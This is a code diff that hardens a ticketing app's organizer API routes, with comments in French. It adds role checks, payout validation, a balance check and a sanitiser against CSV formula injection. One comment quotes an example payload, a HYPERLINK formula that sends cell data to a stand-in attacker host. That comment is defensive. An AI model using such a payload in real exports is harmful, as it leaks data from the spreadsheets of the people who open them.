@@ -1,5 +1,6 @@
+import crypto from "crypto";
 import express from "express";
-import { supabase, supabaseAdmin } from "../lib/config.js";
+import { supabase } from "../lib/config.js";
 import { getDB, saveDB } from "../lib/db.js";
 import { requireRole } from "../lib/auth.js";
 import { runInBackground } from "../lib/utils.js";
@@ -8,6 +9,17 @@ import { getDefaultCommissionRate, computeCommissionBreakdown } from "../lib/com
 import { validateOrganizerAlias, MAX_ORGANIZER_BIO_LENGTH } from "../lib/organizerAlias.js";
 
 const router = express.Router();
+
+// Neutralise l'injection de formule dans les exports CSV (=, +, -, @ en tête de cellule) :
+// buyer_name/buyer_email viennent de l'acheteur (checkout invité, non restreint), donc un
+// nom du type =HYPERLINK("http://attaquant.tld/steal?d="&A1) pourrait s'exécuter dans le
+// tableur de l'organisateur qui ouvre l'export. Le préfixe apostrophe force Excel/Sheets à
+// traiter la cellule comme du texte littéral plutôt que comme une formule.
+function csvSafeCell(value: unknown): string {
+  const str = String(value ?? "");
+  const sanitized = /^[=+\-@]/.test(str) ? `'${str}` : str;
+  return `"${sanitized.replace(/"/g, '""')}"`;
+}
 
 // Statistics Endpoint for Organizers
 router.get("/api/organizer/export", requireRole("organizer", "admin"), async (req: express.Request, res: express.Response) => {
@@ -20,14 +32,13 @@ router.get("/api/organizer/export", requireRole("organizer", "admin"), async (re
 
   try {
     let matchedTickets: any[] = [];
-    const backendClient = supabaseAdmin || supabase;
-    if (backendClient) {
-      const { data: organizerEvents, error: eventsError } = await backendClient
+    if (supabase) {
+      const { data: organizerEvents, error: eventsError } = await supabase
         .from("events")
         .select("id")
         .eq("organizer_id", requestedOrganizerId);
       if (eventsError) throw eventsError;
-      
+
       const eventIds = (organizerEvents || []).map((e: any) => e.id);
       if (eventIds.length > 0) {
         const { data: tkts, error: tktsError } = await supabase
@@ -44,7 +55,7 @@ router.get("/api/organizer/export", requireRole("organizer", "admin"), async (re
       const eventIds = organizerEvents.map((e: any) => e.id);
       matchedTickets = db.tickets.filter((t: any) => eventIds.includes(t.eventId));
     }
-    
+
     // Generate CSV
     const header = [
       "ID Transaction",
@@ -61,9 +72,9 @@ router.get("/api/organizer/export", requireRole("organizer", "admin"), async (re
     const rows = matchedTickets.map((t: any) => [
       t.transaction_ref || t.transactionRef || "",
       t.purchase_date || t.purchaseDate || "",
-      `"${(t.event_title || t.eventTitle || "").replace(/"/g, '""')}"`,
-      `"${(t.buyer_name || t.buyerName || "").replace(/"/g, '""')}"`,
-      `"${(t.buyer_email || t.buyerEmail || "").replace(/"/g, '""')}"`,
+      csvSafeCell(t.event_title || t.eventTitle || ""),
+      csvSafeCell(t.buyer_name || t.buyerName || ""),
+      csvSafeCell(t.buyer_email || t.buyerEmail || ""),
       t.quantity || 1,
       t.tier || "standard",
       t.price_paid || t.pricePaid || 0,
@@ -80,7 +91,7 @@ router.get("/api/organizer/export", requireRole("organizer", "admin"), async (re
   }
 });
 
-router.get("/api/organizer/stats", async (req: express.Request, res: express.Response) => {
+router.get("/api/organizer/stats", requireRole("organizer", "admin"), async (req: express.Request, res: express.Response) => {
   const authUser = (req as any).user;
   const { organizerId } = req.query;
 
@@ -96,9 +107,8 @@ router.get("/api/organizer/stats", async (req: express.Request, res: express.Res
 
   if (supabase) {
     try {
-      const backendClient = supabaseAdmin || supabase;
       // 1. Get organizer events
-      const { data: organizerEvents, error: eventsError } = await backendClient
+      const { data: organizerEvents, error: eventsError } = await supabase
         .from("events")
         .select("*")
         .eq("organizer_id", organizerId);
@@ -167,7 +177,8 @@ router.get("/api/organizer/stats", async (req: express.Request, res: express.Res
 
   const db = getDB();
   
-  // Custom filter if and only if organizer created it. (For fallback simulation let's grant view of all tickets of their events!)
+  // Repli db.json : mêmes données que la branche Supabase ci-dessus, filtrées sur les
+  // événements de cet organisateur.
   const organizerEvents = db.events.filter((e: any) => e.organizerId === organizerId);
   const eventIds = organizerEvents.map((e: any) => e.id);
 
@@ -201,10 +212,48 @@ router.get("/api/organizer/stats", async (req: express.Request, res: express.Res
 });
 
 // --- Payouts (Demandes de retrait) ---
-router.post("/api/organizer/payouts", async (req: express.Request, res: express.Response) => {
+
+const PAYOUT_METHODS = new Set(["orange_money", "mtn_momo", "moov_money", "wave", "bank_transfer"]);
+
+// Solde net réellement disponible pour un organisateur : revenu net cumulé (déjà calculé
+// pour /api/organizer/stats) moins les retraits déjà demandés (en attente ou payés) — pour
+// empêcher qu'une demande de retrait dépasse ce que l'organisateur a effectivement gagné.
+async function getOrganizerAvailableBalance(organizerId: string): Promise<number> {
+  if (!supabase) return 0; // db.json : pas de contrôle de solde en dev local (voir limitation documentée)
+
+  const { data: organizerEvents } = await supabase
+    .from("events")
+    .select("id, commission_rate")
+    .eq("organizer_id", organizerId);
+  const eventIds = (organizerEvents || []).map((e: any) => e.id);
+
+  let matchedTickets: any[] = [];
+  if (eventIds.length > 0) {
+    const { data: tkts } = await supabase.from("tickets").select("price_paid, event_id").in("event_id", eventIds);
+    matchedTickets = tkts || [];
+  }
+
+  const defaultRate = await getDefaultCommissionRate();
+  const rateById = new Map((organizerEvents || []).map((e: any) => [e.id, e.commission_rate != null ? Number(e.commission_rate) : null]));
+  const { totalRevenue } = computeCommissionBreakdown(matchedTickets, rateById, defaultRate);
+
+  const { data: existingPayouts } = await supabase
+    .from("payouts")
+    .select("amount")
+    .eq("organizer_id", organizerId)
+    .in("status", ["paid", "pending"]);
+  const alreadyRequested = (existingPayouts || []).reduce((sum: number, p: any) => sum + Number(p.amount || 0), 0);
+
+  return totalRevenue - alreadyRequested;
+}
+
+router.post("/api/organizer/payouts", requireRole("organizer", "admin"), async (req: express.Request, res: express.Response) => {
   const authUser = (req as any).user;
   const { amount, method, details } = req.body;
-  if (!amount || !method) return res.status(400).json({ error: "Champs manquants" });
+  const numericAmount = Number(amount);
+  if (!Number.isFinite(numericAmount) || numericAmount <= 0 || !PAYOUT_METHODS.has(String(method))) {
+    return res.status(400).json({ error: "Montant ou méthode de retrait invalide." });
+  }
 
   // Anti-IDOR : un organisateur ne peut poser une demande de retrait que pour lui-même.
   const requestedOrganizerId = String(req.body.organizerId || authUser.id || "");
@@ -213,15 +262,22 @@ router.post("/api/organizer/payouts", async (req: express.Request, res: express.
   }
   const organizerId = requestedOrganizerId;
 
+  // Contrôle de solde réel (Supabase uniquement) : en repli db.json (dev local), il n'existe
+  // pas de calcul de solde fiable équivalent, donc on n'applique pas ce contrôle plutôt que de
+  // bloquer systématiquement toute demande de retrait en développement.
+  const availableBalance = await getOrganizerAvailableBalance(organizerId);
+  if (supabase && numericAmount > availableBalance) {
+    return res.status(400).json({ error: "Le montant demandé dépasse votre solde disponible." });
+  }
+
   const payout = {
-    id: `pay-${Date.now()}`, organizerId, amount: Number(amount), status: "pending" as const,
+    id: `pay-${crypto.randomUUID()}`, organizerId, amount: numericAmount, status: "pending" as const,
     requestDate: new Date().toISOString(), method, details
   };
 
-  const backendClient = supabaseAdmin || supabase;
-  if (backendClient) {
+  if (supabase) {
     try {
-      const { error } = await backendClient.from("payouts").insert({
+      const { error } = await supabase.from("payouts").insert({
         id: payout.id, organizer_id: payout.organizerId, amount: payout.amount,
         status: payout.status, request_date: payout.requestDate, method: payout.method, details: payout.details
       });
@@ -237,8 +293,8 @@ router.post("/api/organizer/payouts", async (req: express.Request, res: express.
 
   try {
     let organizerName = db.users.find((u: any) => u.id === organizerId)?.name;
-    if (!organizerName && backendClient) {
-      const { data: organizerUser } = await backendClient.from("users").select("name").eq("id", organizerId).maybeSingle();
+    if (!organizerName && supabase) {
+      const { data: organizerUser } = await supabase.from("users").select("name").eq("id", organizerId).maybeSingle();
       organizerName = organizerUser?.name;
     }
     runInBackground(sendAdminPayoutRequestEmail(organizerName || organizerId, payout));
@@ -249,7 +305,7 @@ router.post("/api/organizer/payouts", async (req: express.Request, res: express.
   res.json({ success: true, payout });
 });
 
-router.get("/api/organizer/payouts", async (req: express.Request, res: express.Response) => {
+router.get("/api/organizer/payouts", requireRole("organizer", "admin"), async (req: express.Request, res: express.Response) => {
   const authUser = (req as any).user;
   const { organizerId } = req.query;
 
@@ -259,12 +315,14 @@ router.get("/api/organizer/payouts", async (req: express.Request, res: express.R
     return res.status(403).json({ error: "Accès refusé : ressource d'un autre organisateur." });
   }
 
-  const backendClient = supabaseAdmin || supabase;
-  if (backendClient) {
+  if (supabase) {
     try {
-      const { data, error } = await backendClient.from("payouts").select("*").eq("organizer_id", organizerId);
-      if (!error) return res.json(data.map((p: any) => ({...p, organizerId: p.organizer_id, requestDate: p.request_date})));
-    } catch(e) {}
+      const { data, error } = await supabase.from("payouts").select("*").eq("organizer_id", organizerId);
+      if (error) throw error;
+      return res.json((data || []).map((p: any) => ({...p, organizerId: p.organizer_id, requestDate: p.request_date})));
+    } catch(e: any) {
+      console.warn("[Supabase Error] Fetching payouts, falling back to local file DB:", e.message);
+    }
   }
   const db = getDB();
   res.json((db.payouts || []).filter(p => p.organizerId === organizerId || (p as any).organizer_id === organizerId));
@@ -275,10 +333,9 @@ router.get("/api/organizer/payouts", async (req: express.Request, res: express.R
 router.get("/api/organizer/profile", requireRole("organizer", "admin"), async (req: express.Request, res: express.Response) => {
   const authUser = (req as any).user;
 
-  const backendClient = supabaseAdmin || supabase;
-  if (backendClient) {
+  if (supabase) {
     try {
-      const { data, error } = await backendClient
+      const { data, error } = await supabase
         .from("users")
         .select("organizer_alias, organizer_bio")
         .eq("id", authUser.id)
@@ -302,10 +359,9 @@ router.get("/api/organizer/check-alias", requireRole("organizer", "admin"), asyn
     return res.json({ available: false, error: result.error });
   }
 
-  const backendClient = supabaseAdmin || supabase;
-  if (backendClient) {
+  if (supabase) {
     try {
-      const { data, error } = await backendClient
+      const { data, error } = await supabase
         .from("users")
         .select("id")
         .ilike("organizer_alias", result.alias)
@@ -337,10 +393,9 @@ router.patch("/api/organizer/profile", requireRole("organizer", "admin"), async 
 
   const trimmedBio = String(bio || "").trim().slice(0, MAX_ORGANIZER_BIO_LENGTH);
 
-  const backendClient = supabaseAdmin || supabase;
-  if (backendClient) {
+  if (supabase) {
     try {
-      const { data: existing, error: checkError } = await backendClient
+      const { data: existing, error: checkError } = await supabase
         .from("users")
         .select("id")
         .ilike("organizer_alias", result.alias)
@@ -351,11 +406,19 @@ router.patch("/api/organizer/profile", requireRole("organizer", "admin"), async 
         return res.status(409).json({ error: "Cet alias est déjà pris." });
       }
 
-      const { error: updateError } = await backendClient
+      const { error: updateError } = await supabase
         .from("users")
         .update({ organizer_alias: result.alias, organizer_bio: trimmedBio })
         .eq("id", authUser.id);
-      if (updateError) throw updateError;
+      if (updateError) {
+        // Contrainte unique Postgres (users_organizer_alias_unique) : rattrape la course entre
+        // la vérification ci-dessus et cet UPDATE (deux organisateurs choisissant le même alias
+        // au même moment) avec le message attendu plutôt qu'une erreur 500 générique.
+        if ((updateError as any).code === "23505") {
+          return res.status(409).json({ error: "Cet alias est déjà pris." });
+        }
+        throw updateError;
+      }
 
       return res.json({ success: true, alias: result.alias, bio: trimmedBio });
     } catch (err: any) {
